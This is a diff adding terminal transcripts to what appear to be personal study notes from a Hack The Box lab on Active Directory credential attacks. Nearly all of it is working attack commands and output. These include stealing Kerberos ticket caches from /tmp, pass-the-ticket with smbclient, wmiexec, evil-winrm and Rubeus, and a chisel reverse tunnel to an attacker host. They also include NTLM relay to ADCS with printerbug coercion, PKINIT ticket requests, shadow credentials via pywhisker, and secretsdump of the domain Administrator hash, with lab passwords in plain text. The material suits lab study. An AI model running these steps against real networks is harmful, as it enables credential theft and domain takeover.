@@ -2159,40 +2159,434 @@ david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfil
         AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
 ```
 ```
-a
+david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
+
+Password: 
+carlos@inlanefreight.htb@linux01:~$ klist 
+Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
+Default principal: carlos@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+        renew until 10/08/2022 11:01:13
 ```
 ```
-a
+mdmithu@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
+                  
+svc_workstations@inlanefreight.htb@10.129.204.23's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)          
+...SNIP...
+
+svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
+[sudo] password for svc_workstations@inlanefreight.htb: 
+Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User svc_workstations@inlanefreight.htb may run the following commands on linux01:
+    (ALL) ALL
+svc_workstations@inlanefreight.htb@linux01:~$ sudo su
+root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
+root
 ```
 
 ```
-a
+  Pass the Ticket (PtT) from Linux
+root@linux01:~# ls -la /tmp
+
+total 76
+drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
+drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
+-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
+-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
+-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
+-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
+-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
+-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
 ```
 
 ```
-a
+root@linux01:~# id julio@inlanefreight.htb
+
+uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
 ```
 
 ```
-a
+root@linux01:~# klist
+
+klist: No credentials cache found (filename: /tmp/krb5cc_0)
+root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
+root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+root@linux01:~# klist
+Ticket cache: FILE:/root/krb5cc_647401106_I8I133
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+        renew until 10/08/2022 13:25:01
+root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
+  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
+  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
+  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
+  john                                D        0  Mon Jul 18 13:19:50 2022
+  julio                               D        0  Mon Jul 18 13:54:02 2022
+  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
+  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
+  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
+  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
+  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
+  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
+  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
+  tools                               D        0  Thu Sep 22 18:19:04 2022
+  Users                              DR        0  Thu Oct  6 11:46:05 2022
+  Windows                             D        0  Wed Oct  5 13:20:00 2022
+
 ```
 ```
-a
+[/htb]$ cat /etc/hosts
+
+# Host addresses
+
+172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
+172.16.1.5  ms01.inlanefreight.htb  ms01
 ```
 ```
-a
+[/htb]$ cat /etc/proxychains.conf
+
+...SNIP...
+
+[ProxyList]
+socks5 127.0.0.1 108
 ```
 
 ```
-a
+mdmithu@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+mdmithu@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
+mdmithu@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
+mdmithu@htb[/htb]$ sudo ./chisel server --reverse 
+
+2022/10/10 07:26:15 server: Reverse tunneling enabled
+2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
+2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
 ```
+##### Connect to MS01 with xfreerdp
 
 ```
-a
-```
+mdmithu@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
 
 ```
-a
-```
+##### Execute chisel from MS01
 
+```
+C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+
+2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
+2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
+```
+```
+[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+```
+##### Impacket
+
+```
+[/htb]$ proxychains impacket-wmiexec dc01 -k
+
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
+[*] SMBv3.0 dialect used
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
+[proxychains] Strict chain  ...
+```
+```
+[/htb]$ sudo apt-get install krb5-user -y
+
+Reading package lists... Done                                                                                                  
+Building dependency tree... Done    
+Reading state information... Done
+
+```
+```
+[/htb]$ cat /etc/krb5.conf
+
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+...SNIP...
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+```
+```
+[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
+
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
+*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
+inlanefreight\julio
+DC01
+```
+##### Impacket Ticket converter
+
+```
+mdmithu@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] converting ccache to kirbi...
+[+] done
+```
+```
+C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+C:\htb> klist
+
+Current LogonId is 0:0x31adf02
+
+Cached Tickets: (1)
+
+#0>     Client: julio @ INLANEFREIGHT.HTB
+        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
+        Start Time: 10/10/2022 5:46:02 (local)
+        End Time:   10/10/2022 15:46:02 (local)
+        Renew Time: 10/11/2022 5:46:02 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+C:\htb>dir \\dc01\julio
+ Volume in drive \\dc01\julio has no label.
+ Volume Serial Number is B8B3-0D72
+
+ Directory of \\dc01\julio
+
+07/14/2022  07:25 AM    <DIR>          .
+07/14/2022  07:25 AM    <DIR>          ..
+07/14/2022  04:18 PM                17 julio.txt
+               1 File(s)             17 bytes
+               2 Dir(s)  18,161,782,784 bytes free
+```
+##### Linikatz download and execution
+```
+mdmithu@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+mdmithu@htb[/htb]$ /opt/linikatz.sh
+ _ _       _ _         _
+| (_)_ __ (_) | ____ _| |_ ____
+| | | '_ \| | |/ / _` | __|_  /
+| | | | | | |   < (_| | |_ / /
+|_|_|_| |_|_|_|\_\__,_|\__/___|
+
+             =[ @timb_machine ]=
+
+I: [freeipa-check] FreeIPA AD configuration
+-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
+-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
+-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
+-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
+-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
+-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
+-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
+I: [sss-check] SSS AD configuration
+-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
+-rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
+-rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
+-rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
+-rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
+-rw-rw-r-- 1 root root 6406312 Oct 10 19:55 /var/lib/sss/mc/group
+-rw-rw-r-- 1 root root 8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
+-rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
+-rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
+-rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
+-rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
+-rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
+I: [vintella-check] VAS AD configuration
+I: [pbis-check] PBIS AD configuration
+I: [samba-check] Samba configuration
+-rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
+-rw-r--r-- 1 root root 8 Jul 18 12:52 /etc/samba/gdbcommands
+I: [kerberos-check] Kerberos configuration
+-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
+-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
+I: [samba-check] Samba machine secrets
+I: [samba-check] Samba hashes
+I: [check] Cached hashes
+I: [sss-check] SSS hashes
+I: [check] Machine Kerberos tickets
+I: [sss-check] SSS ticket list
+Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+Default principal: LINUX01$@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+    renew until 10/11/2022 19:48:03, Flags: RIA
+    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+I: [kerberos-check] User Kerberos tickets
+Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+    renew until 10/08/2022 11:32:01, Flags: FPRIA
+    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+    renew until 10/11/2022 19:55:02, Flags: FPRIA
+    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+Ticket cache: FILE:/tmp/krb5cc_647402606
+Default principal: svc_workstations@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+    renew until 10/11/2022 19:55:02, Flags: FPRIA
+    Etype (skey, tkt): aes256-cts
+```
+#### Pass the Certificate
+
+```
+[/htb]$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+```
+[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+
+[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
+[*] Bind OK
+[*] Got handle
+RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
+[*] Triggered RPC backconnect, this may or may not have worked
+```
+```
+mdmithu@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+mdmithu@htb[/htb]$ python3 -m venv .venv
+mdmithu@htb[/htb]$ source .venv/bin/activate
+mdmithu@htb[/htb]$ pip3 install -r requirements.txt
+```
+```
+[/htb]$ pip3 install -I git+https://github.com/wbond/oscrypto.git
+Defaulting to user installation because normal site-packages is not writeable
+Collecting git+https://github.com/wbond/oscrypto.git
+<SNIP>
+Successfully built oscrypto
+Installing collected packages: asn1crypto, oscrypto
+Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
+```
+```
+b[/htb]$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+
+2025-04-28 21:20:40,073 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-04-28 21:20:40,351 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-04-28 21:21:05,508 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-04-28 21:21:05,508 minikerberos INFO     3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
+INFO:minikerberos:3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
+2025-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+```
+```
+mdmithu@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
+mdmithu@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
+<SNIP>
+```
+```
+mdmithu@htb[/htb]$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+
+[*] Searching for the target account
+[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
+[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
+[+] PFX exportiert nach: eFUVVTPf.pfx
+[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
+[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
+[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+```
+mdmithu@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-04-28 20:50:04,929 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-04-28 20:50:04,929 minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
+INFO:minikerberos:f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
+2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file`
+
+```
+```
+mdmithu@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache
+mdmithu@htb[/htb]$ klist
+
+Ticket cache: FILE:/tmp/jpinkman.ccache
+Default principal: jpinkman@INLANEFREIGHT.LOCAL
+
+Valid starting       Expires              Service principal
+04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+```
+```
+mdmithu@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
+inlanefreight\jpinkman
+```
 
